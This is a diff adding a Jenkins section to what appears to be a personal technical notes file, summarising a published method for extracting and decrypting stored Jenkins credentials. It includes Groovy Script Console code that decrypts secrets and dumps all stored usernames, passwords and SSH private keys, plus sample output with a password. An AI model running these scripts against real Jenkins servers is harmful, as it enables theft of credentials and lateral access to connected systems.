@@ -140,6 +140,73 @@ Anyone who shows up as "External Azure Active Directory" is a user who is alread
 
 [How DNS works](https://howdns.works/)
 
+# Jenkins
+
+## Accessing and dumping Jenkins credentials
+
+**Source:** https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials
+
+### Grabbing credentials using a browser inspection tool
+
+1. Navigate to http://<Jenkins FQDN>/credentials/
+2. Update any of the credentials.
+3. Open dev console (Example: F12 in Chrome).
+4. Inspect the dotted element.
+5. Copy text value of value
+
+![](./images/jenkins-00.webp)
+![](./images/jenkins-01.webp)
+
+In my case the encrypted secret is
+
+```text
+{AQAAABAAAAAgPT7JbBVgyWiivobt0CJEduLyP0lB3uyTj+D5WBvVk6jyG6BQFPYGN4Z3VJN2JLDm}
+```
+
+To decrypt any credentials we can use Jenkins console which requires admin privileges to access.
+
+To open Script Console navigate to http://<Jenkins FQDN>/script
+
+Tell jenkins to decrypt and print out the secret value:
+
+```groovy
+println hudson.util.Secret.decrypt("{AQAAABAAAAAgPT7JbBVgyWiivobt0CJEduLyP0lB3uyTj+D5WBvVk6jyG6BQFPYGN4Z3VJN2JLDm}")
+```
+![](./images/jenkins-02.webp)
+
+There you have it; now you can decrypt any Jenkins secret (if you have admin privileges).
+
+### Iterate and decrypt credentials from the console
+
+Another way is to list all credentials then decrypt them from the console:
+
+```groovy
+def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
+    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
+    Jenkins.instance,
+    null,
+    null
+)
+
+for(c in creds) {
+  if(c instanceof com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey){
+    println(String.format("id=%s desc=%s key=%s\n", c.id, c.description, c.privateKeySource.getPrivateKeys()))
+  }
+  if (c instanceof com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl){
+    println(String.format("id=%s desc=%s user=%s pass=%s\n", c.id, c.description, c.username, c.password))
+  }
+}
+```
+
+Output:
+
+```text
+id=gitlab  desc=gitlabadmin user=gitlabadmin pass=Drmhze6EPcv0fN_81Bj
+id=production-bastion  desc=production-bastion key=[-----BEGIN RSA PRIVATE KEY...
+```
+
+This script is not finished though. You can look up all the credential class names in the Jenkins source code.
+
 # Linux
 
 ## STIG-Partitioned Enterprise Linux (spel)
